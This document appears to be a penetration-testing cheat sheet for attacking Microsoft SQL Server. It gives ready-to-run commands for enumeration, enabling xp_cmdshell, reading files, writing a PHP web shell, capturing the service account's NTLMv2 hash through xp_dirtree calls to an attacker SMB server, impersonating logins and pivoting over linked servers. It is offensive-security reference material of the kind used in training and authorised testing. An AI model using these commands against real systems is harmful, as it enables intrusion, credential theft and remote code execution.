# MSSQL

## **Introduction**

> Microsoft SQL (MSSQL) is Microsoft's SQL-based relational database management system\
> The default MSSQL port is 1433 TCP

***

## **MSSQL Enumeration & Connection to the Server**

* Enumeration with Nmap NSE:\
  `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248`
* Log in to the MSSQL server using Windows authentication:\
  `mssqlclient.py <user>@<FQDN/IP> -windows-auth`
* Connect to the MSSQL Server using sqlcmd:\
  `sqlcmd -S SRVMSSQL -U validuser -P validpassword -y 30 -Y 30`
* Connect to the MSSQL Server using sqsh:\
  `sqsh -S 10.129.203.7 -U validuser -P validpassword -h`
* Connect using local windows account:\
  `sqsh -S 10.129.203.7 -U .\\validuser -P validpassword -h`

***

## **Interacting with a MSSQL Server**

| Command                                                  | Description                        |
| -------------------------------------------------------- | ---------------------------------- |
| SELECT name FROM master.dbo.sysdatabases                 | Show databases                     |
| USE users                                                | Use a database                     |
| SELECT table\_name FROM users.INFORMATION\_SCHEMA.TABLES | Show tables from users database    |
| SELECT \* FROM users                                     | Select all Data from Table "users" |

***

## **MSSQL Command Execution**

> MSSQL can allow command execution through the xp\_cmdshell command: `xp_cmdshell 'whoami'`\
> The commands will be executed using the mssql's service account privileges.

**Enabling xp\_cmdshell:**\
If xp\_cmdshell is disabled, you might be able to enable it using the following commands:

```
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

***

## **MSSQL File Read**

We can read any file to which the account has read access using the following query:

`SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`

***

## **MSSQL File Write**

> * To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges
> * After that, we need to execute some stored procedures to create the file:

1.  **Enable Ole Automation Procedures:**

    ```
    sp_configure 'show advanced options', 1
    RECONFIGURE
    sp_configure 'Ole Automation Procedures', 1
    RECONFIGURE
    ```
2.  **Create a File:**

    ```
    DECLARE @OLE INT
    DECLARE @FileID INT
    EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
    EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\path\to\your\webshell.php', 8, 1
    EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
    EXECUTE sp_OADestroy @FileID
    EXECUTE sp_OADestroy @OLE
    ```

***

## **Capture MSSQL Service Hash**

> * It's possible to capture the MSSQL Service user's account hash using a fake SMB Server or Responder
> * When using the MSSQL `xp_subdirs` or `xp_dirtree` stored procedures pointing to our fake SMB Server, the MSSQL Service will be forced to authenticate using his NTLMv2 hash

**Follow these steps:**

1. Start Responder or start SMB fake server:\
   `sudo responder -I tun0` or `sudo impacket-smbserver share ./ -smb2support`
2. Hash stealing through xp\_dirtree: `EXEC master..xp_dirtree '\\10.10.110.17\share\'`
3. Hash stealing through xp\_subdirs: `EXEC master..xp_subdirs '\\10.10.110.17\share\'`

***

## **MSSQL - Impersonate Existing Users**

> SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends

**To impersonate a user:**

1.  Verify if current account is a sysadmin (By default, sysadmins can impersonate any user)

    ```
    SELECT SYSTEM_USER
    SELECT IS_SRVROLEMEMBER('sysadmin')
    ```
2.  Identify the users that we can impersonate:

    ```
    SELECT distinct b.name
    FROM sys.server_permissions a
    INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
    WHERE a.permission_name = 'IMPERSONATE'
    ```
3.  Impersonate a user (example: sa)

    ```
    EXECUTE AS LOGIN = 'sa'
    ```

***

## **Communicating with Other Databases \[Linked Servers]**

> * MSSQL has a configuration option called linked servers
> * If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server.
> * Administrators can configure a linked server using credentials from the remote server.
> * If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.

**Follow these steps:**

1. Identify Linked Servers in MSSQL:\
   `SELECT srvname, isremote FROM sysservers`
2. Identify the user for the connection and its privileges:\
   `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.10.10.100\SQLSERVERNAME]`
